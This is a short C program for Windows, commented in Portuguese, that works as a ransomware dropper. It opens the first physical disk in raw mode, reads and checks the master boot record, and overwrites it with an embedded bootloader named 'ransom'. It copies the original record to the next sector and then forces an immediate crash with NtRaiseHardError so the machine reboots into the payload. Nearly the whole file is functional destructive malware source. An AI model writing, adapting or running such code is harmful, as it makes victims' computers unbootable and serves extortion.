#include <stdio.h>
#include <windows.h>

#define SECTOR_SIZE 512
	#define MBR_SIG "\x55\xAA"

#pragma comment(lib, "ntdll.lib")

/*
1. Acessar HD -> CreateFile
2. Ler MBR original -> ReadFile
3. Verificar assinatura de bootloader
4. Escrevemos o malware na MBR
5. Salvar a MBR original
*/

extern char binary_ransom_bin_start[] __asm__("_binary_ransom_bin_start");
extern char binary_ransom_bin_size[] __asm__("_binary_ransom_bin_size");

NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PVOID Parameters, ULONG ResponseOption, PULONG ResponsePointer);

int main() {
	
	HANDLE hDisk;
	unsigned char cBackup[SECTOR_SIZE];
	unsigned char cInfected[SECTOR_SIZE*2];
	//unsigned char cXor[SECTOR_SIZE];
	DWORD bytesRead = 0;
	DWORD bytesWritten = 0;
	BOOLEAN privilegeOld = FALSE;
	ULONG response = 0;

	unsigned char* bootloader = (unsigned char*)binary_ransom_bin_start;
	unsigned int bootloaderSize = (unsigned int)binary_ransom_bin_size;	

	hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hDisk == INVALID_HANDLE_VALUE) {
		printf("Falhou o CreateFile\n");
		exit(1);
	}

	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!ReadFile(hDisk, cBackup, SECTOR_SIZE, &bytesRead, NULL)) {
		printf("Deu ruim em ReadFile\n");
		CloseHandle(hDisk);
		exit(1);
	}

	if (memcmp(&cBackup[SECTOR_SIZE - 2], MBR_SIG, 2)) {
		printf("A assinatura não confere\n");
		CloseHandle(hDisk);
		exit(1);
	}

	memcpy(cInfected, bootloader, bootloaderSize);

	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!WriteFile(hDisk, cInfected, bootloaderSize, &bytesWritten, NULL)) {
		printf("Deu ruim em WriteFile\n");
		CloseHandle(hDisk);
		exit(1);
	}

	if (!WriteFile(hDisk, cBackup, SECTOR_SIZE, &bytesWritten, NULL)) {
		printf("Deu ruim em WriteFile2\n");
		CloseHandle(hDisk);
		exit(1);
	}

	RtlAdjustPrivilege(19, TRUE, FALSE, &privilegeOld);
	NtRaiseHardError(0XDEADDEAD, 0, 0, 0, 6, &response); 

	return 0;
}
